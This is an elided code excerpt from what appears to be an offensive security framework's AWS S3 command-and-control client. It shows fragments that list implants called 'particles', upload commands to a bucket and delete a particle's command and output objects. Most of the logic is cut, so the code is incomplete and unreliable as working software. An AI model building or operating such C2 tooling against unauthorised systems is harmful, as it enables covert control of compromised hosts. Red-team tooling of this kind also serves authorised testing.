# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-Nebula\client\commands\aws_s3_c2_client.py
import base64
import os
import sys
import time
...
def getparticlelist(profile, bucket_name, particles):
    try:
        ...
        print(colored(f"[*] Error: {sys.exc_info()[1]}", "red"))
        ...
        if "Contents" in bucketObjectsReq:
            ...
            for object in bucketObjects:
                if object["Key"] == f"{particle_name}/{output_key}":
                    ...
                    print(colored(f"[*] Uploaded command to bucket", "green"))
...
def deleteparticle(
    s3Client, particle_name, bucket_name, commandfile, outputfile, particles
):
    print(colored("The particle seems down. Deleting the bucket dir", "yellow"))

    try:
        s3Client.delete_object(Bucket=bucket_name, Key=f"{particle_name}/{commandfile}")
    except Exception as e:
        pass
    try:
        s3Client.delete_object(Bucket=bucket_name, Key=f"{particle_name}/{outputfile}")
    except Exception as e:
        pass

    try:
        s3Client.delete_object(Bucket=bucket_name, Key=f"{particle_name}/")
    except Exception as e:
        pass
    ...
    print(colored("Particle Deleted", "green"))
